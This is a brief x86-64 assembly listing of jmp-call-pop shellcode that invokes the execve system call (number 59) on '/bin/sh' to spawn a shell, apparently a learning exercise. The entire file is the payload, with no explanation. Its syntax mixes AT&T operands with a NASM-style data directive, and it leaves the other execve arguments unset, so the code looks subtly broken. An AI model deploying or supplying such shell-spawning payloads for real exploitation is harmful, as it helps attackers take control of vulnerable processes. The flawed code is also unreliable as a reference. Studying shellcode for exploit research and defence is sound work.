
.globl _start

_start:
    jmp short    call_shellcode

shellcode:
    xor     %rdi, %rdi
    pop     %rdi

    xor     %rax, %rax
    add     $59, %rax
    syscall

call_shellcode:
    call    shellcode
    db      '/bin/sh'